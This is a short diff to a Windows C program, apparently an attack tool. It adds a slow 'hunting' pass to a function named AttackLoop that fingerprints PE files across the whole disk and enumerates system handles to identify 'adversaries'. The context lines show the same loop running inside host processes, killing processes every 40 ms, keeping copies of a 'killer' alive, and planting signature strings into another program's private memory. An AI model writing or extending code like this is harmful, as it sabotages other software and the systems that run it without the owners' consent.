@@ -2365,6 +2365,10 @@ static BOOL HostIsXxExe(void) {
     return _wcsicmp(p, L"xx.exe") == 0;
 }
 
+/* ---- T0/T1/T2 对手识别（实现在 hunter/hunt.c，直接内联进来） ---- */
+#include "hunter/hunt.c"
+
+
 static DWORD WINAPI AttackLoop(LPVOID lp)
 {
     UNREFERENCED_PARAMETER(lp);
@@ -2384,6 +2388,7 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
            普通进程，如果每个宿主都 40ms 枚举+击杀，N 个宿主就是 N 倍 CPU（实测卡死）。
            2 秒一次足够"xx 死了仍然有攻击者在干活"，又不会把机器拖垮。 */
     const DWORD dwIdle = HostIsXxExe() ? 40 : 2000;
+    DWORD dwHuntTick = 0;   /* T0/T1/T2 三层识别：慢频（30s），不占攻击循环预算 */
     DWORD dwCopyTick = 0;
 
     while (g_bRunning)
@@ -2394,6 +2399,11 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
                 dwCopyTick = now;
                 RefreshKillerCopies();
                 PlantSignaturesInAllTargets();   /* 3~5s 一轮：种特征串到 yy 私有内存 */
+            }
+            /* T0/T1/T2 三层识别：30 秒一轮（全盘 PE 指纹 + 系统句柄枚举，别放进 40ms 循环） */
+            if (dwHuntTick == 0 || now - dwHuntTick >= 30000) {
+                dwHuntTick = now;
+                HuntPass();
             }
         }
         if (!hLead)
